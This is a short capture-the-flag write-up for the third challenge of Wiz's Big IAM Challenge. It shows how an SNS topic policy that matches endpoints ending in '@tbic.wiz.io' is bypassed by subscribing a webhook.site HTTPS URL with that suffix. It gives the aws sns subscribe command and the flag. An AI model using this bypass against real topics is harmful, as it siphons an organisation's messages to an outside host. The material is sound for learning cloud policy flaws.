# Big_IAM_challenge-3
We got a message for you. Can you get it?

As long as the endpoint ends in @tbic.wiz.io, this IAM policy permits anyone to subscribe to the SNS TBICWizPushNotifications topic.

You'll need to use a different protocol to subscribe to it if you don't already have an email account that ends with that domain.


To subscribe to and get notifications from this webhook, I'll utilise the HTTPS protocol in conjunction with this tool: https://webhook.site/. Click here to get a unique URL.

Your unique URL should include /@tbic.wiz.io at the end. As an illustration, consider https://webhook.site/random-string/@tbic.wiz.io.

> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://webhook.site/random-string/@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}

A message confirming your subscription should now appear in the webhook dashboard. Please click the SubscribeURL in the message to verify the subscription.

You'll keep getting message-based notifications when you confirm your subscription. This is the flag message.


Shown as {wiz:always-suspect-asterisks}
